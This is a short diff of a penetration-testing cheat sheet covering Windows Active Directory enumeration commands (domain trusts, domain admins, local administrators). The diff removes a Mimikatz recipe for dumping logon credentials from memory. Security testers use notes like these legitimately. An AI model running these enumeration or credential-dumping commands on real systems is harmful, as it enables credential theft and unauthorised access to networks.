@@ -52,12 +52,6 @@ nltest /server:[address] /domain_trusts` - map domain trusts
 `net group "domain admins" /DOMAIN` - show domain admins  
 `net localgroup "administrators" /DOMAIN` - show local admins  
 
-Mimikatz:
-
-1) Run as admin
-2) `privilege::debug`
-3) `sekurlsa::LogonPasswords full`
-
 Null Session
 ------------
 
